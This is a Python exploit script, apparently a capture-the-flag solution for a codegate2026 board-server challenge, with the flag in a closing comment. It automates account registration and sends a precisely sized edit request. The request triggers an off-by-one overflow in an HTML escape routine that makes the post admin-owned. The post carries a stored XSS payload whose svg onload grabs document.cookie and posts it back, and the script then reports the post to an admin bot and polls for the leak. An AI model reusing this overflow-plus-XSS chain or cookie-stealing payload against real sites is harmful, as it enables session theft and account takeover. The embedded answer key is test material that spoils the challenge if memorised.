#!/usr/bin/env python3
import html
import random
import re
import socket
import string
import sys
import time
import urllib.parse


LAUNCHER_HOST = "43.203.102.235"
LAUNCHER_PORT = 9883


def rand_token(n=8):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


def escape_weight(text: str) -> int:
    weight = 0
    for ch in text:
        if ch in "<>":
            weight += 4
        elif ch in "&'":
            weight += 5
        elif ch == '"':
            weight += 6
        else:
            weight += 1
    return weight


def build_xss_payload(leak_title: str) -> str:
    prefix = (
        f"<form id=f method=POST action=/post/new>"
        f"<input name=title value={leak_title}>"
        "<input name=content>"
        "</form>"
        "<svg onload='f[1].value=document.cookie;f.submit()'>"
    )
    # The escape routine subtracts 6 from the destination size up front,
    # then keeps processing while escaped_len <= size-6. The last processed
    # character must therefore be a quote so its trailing NUL lands on uid LSB.
    rem = 0x5FFA - escape_weight(prefix)
    if rem < 0:
        raise ValueError("prefix too long")
    quote_fill, plain_fill = divmod(rem, 6)
    return prefix + ('"' * quote_fill) + ("A" * plain_fill) + '"'


class Client:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.cookies = {}

    def _cookie_header(self):
        if not self.cookies:
            return None
        return "; ".join(f"{k}={v}" for k, v in self.cookies.items())

    def request(self, method: str, path: str, body=None, headers=None):
        hdrs = {"Host": self.host, "Connection": "close"}
        if headers:
            hdrs.update(headers)
        cookie = self._cookie_header()
        if cookie:
            hdrs["Cookie"] = cookie
        if body is None:
            body_bytes = b""
        elif isinstance(body, bytes):
            body_bytes = body
        else:
            body_bytes = body.encode()
        if body_bytes:
            hdrs["Content-Length"] = str(len(body_bytes))

        req_lines = [f"{method} {path} HTTP/1.1"]
        req_lines.extend(f"{k}: {v}" for k, v in hdrs.items())
        req = ("\r\n".join(req_lines) + "\r\n\r\n").encode() + body_bytes

        sock = socket.create_connection((self.host, self.port), timeout=10)
        sock.settimeout(10)
        chunks = []
        try:
            sock.sendall(req)
            while True:
                try:
                    chunk = sock.recv(65535)
                except ConnectionResetError:
                    # Remote sometimes sends a full response and then resets.
                    break
                if not chunk:
                    break
                chunks.append(chunk)
        finally:
            sock.close()
        raw = b"".join(chunks)
        head, _, data = raw.partition(b"\r\n\r\n")
        head_text = head.decode("iso-8859-1", "replace")
        lines = head_text.split("\r\n")
        if not lines or " " not in lines[0]:
            raise RuntimeError(f"bad HTTP response: {raw[:200]!r}")
        parts = lines[0].split(" ", 2)
        status = int(parts[1])
        resp_headers = {}
        set_cookies = []
        for line in lines[1:]:
            if ":" not in line:
                continue
            k, v = line.split(":", 1)
            v = v.lstrip()
            if k.lower() == "set-cookie":
                set_cookies.append(v)
            resp_headers[k] = v
        for cookie_hdr in set_cookies:
            part = cookie_hdr.split(";", 1)[0]
            if "=" in part:
                k, v = part.split("=", 1)
                self.cookies[k] = v
        result = {
            "status": status,
            "headers": resp_headers,
            "body": data,
        }
        return result

    def form(self, method: str, path: str, fields):
        body = urllib.parse.urlencode(fields)
        return self.request(
            method,
            path,
            body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )


def get_instance_port():
    last_err = None
    for _ in range(8):
        sock = socket.create_connection((LAUNCHER_HOST, LAUNCHER_PORT), timeout=10)
        sock.settimeout(10)
        buf = b""
        err = None
        try:
            deadline = time.time() + 12
            while time.time() < deadline:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                buf += chunk
                m = re.search(rb"board server started on port (\d+)", buf)
                if m:
                    return sock, int(m.group(1)), buf.decode("utf-8", "replace")
            err = RuntimeError(f"failed to get instance port, output={buf!r}")
            last_err = err
        finally:
            if err is not None:
                sock.close()
        time.sleep(0.5)
    raise last_err or RuntimeError("failed to get instance port")


def find_post_id(board_html: str, title: str):
    pattern = re.compile(rf'href="/post/(\d+)">{re.escape(title)}</a>')
    m = pattern.search(board_html)
    return int(m.group(1)) if m else None


def get_post_content(page_html: str):
    m = re.search(
        r'<div class="post-content">(.*?)</div>',
        page_html,
        flags=re.S,
    )
    if not m:
        return None
    return html.unescape(m.group(1))


def extract_flag(text: str):
    if not text:
        return None
    m = re.search(r"flag=([^<\s]+)", text)
    if m:
        return m.group(1)
    m = re.search(r"([A-Za-z0-9_{}-]*flag\{[^<]+?\})", text, flags=re.I)
    if m:
        return m.group(1)
    return None


def post_is_admin_xss(page_html: str) -> bool:
    m = re.search(
        r'<div class="post-content">(.*?)</div>',
        page_html,
        flags=re.S,
    )
    if not m:
        return False
    content = m.group(1)
    return content.startswith("<form") and "<svg" in content


def run_once():
    launcher_sock, inst_port, banner = get_instance_port()
    print(f"[+] launcher output:\n{banner.strip()}")
    print(f"[+] instance port: {inst_port}")

    try:
        user = f"u{rand_token(8)}"
        password = f"p{rand_token(8)}"
        post_title = f"p{rand_token(8)}"
        leak_title = f"L{rand_token(3)}"
        xss_payload = build_xss_payload(leak_title)

        client = Client(LAUNCHER_HOST, inst_port)

        print("[+] registering user...")
        r = client.form("POST", "/register", {"username": user, "password": password})
        print(f"[+] register: {r['status']}")

        print("[+] logging in...")
        r = client.form("POST", "/login", {"username": user, "password": password})
        if r["status"] != 302 or "session_id" not in client.cookies:
            raise RuntimeError(f"login failed: {r['status']}")
        print(f"[+] login ok, session_id={client.cookies['session_id']}")

        print("[+] creating base post...")
        r = client.form("POST", "/post/new", {"title": post_title, "content": "x"})
        if r["status"] != 302:
            raise RuntimeError(f"create post failed: {r['status']}")
        print("[+] created base post")

        print("[+] locating base post id...")
        board = client.request("GET", "/board")
        board_html = board["body"].decode("utf-8", "replace")
        post_id = find_post_id(board_html, post_title)
        if post_id is None:
            raise RuntimeError("could not find created post id")
        print(f"[+] base post id: {post_id}")

        raw_body = f"title=h&content={xss_payload}".encode()
        print(f"[+] sending overflow edit ({len(raw_body)} bytes body)...")
        r = client.request(
            "POST",
            f"/post/{post_id}/edit",
            body=raw_body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if r["status"] != 302:
            raise RuntimeError(f"overflow edit failed: {r['status']}")

        page = client.request("GET", f"/post/{post_id}")["body"].decode("utf-8", "replace")
        if not post_is_admin_xss(page):
            print("[+] payload did not fully land on this instance")
            return None
        print("[+] admin-owned raw HTML payload confirmed")

        print("[+] reporting post to admin bot...")
        r = client.request("POST", f"/post/{post_id}/report", body=b"", headers={})
        print(f"[+] report status: {r['status']}")

        for i in range(20):
            time.sleep(1)
            board = client.request("GET", "/board")
            board_html = board["body"].decode("utf-8", "replace")
            leak_post_id = find_post_id(board_html, leak_title)
            print(f"[+] poll {i+1}: leak_post_id={leak_post_id}")
            if leak_post_id is None:
                continue
            post = client.request("GET", f"/post/{leak_post_id}")
            content = get_post_content(post["body"].decode("utf-8", "replace"))
            flag = extract_flag(content or "")
            print(f"[+] leak content: {content}")
            if flag:
                return flag

        print("[+] bot did not leak on this instance")
        return None
    finally:
        launcher_sock.close()


def main():
    print("[+] contacting launcher...")
    for attempt in range(1, 21):
        print(f"[+] attempt {attempt}/20")
        flag = run_once()
        if flag:
            print(f"[+] FLAG: {flag}")
            return
    raise RuntimeError("flag not found after 20 attempts")


if __name__ == "__main__":
    main()

# codegate2026{2f69fef1bde81fa7bdb3ed5a0c63976efc06667e3caf26b0793399868764f0f755d2a69a3f00fdf5596853cf68dfce9691a9ed965ac7f7ed98d1dc1d41052547c2dd39922f7b364f}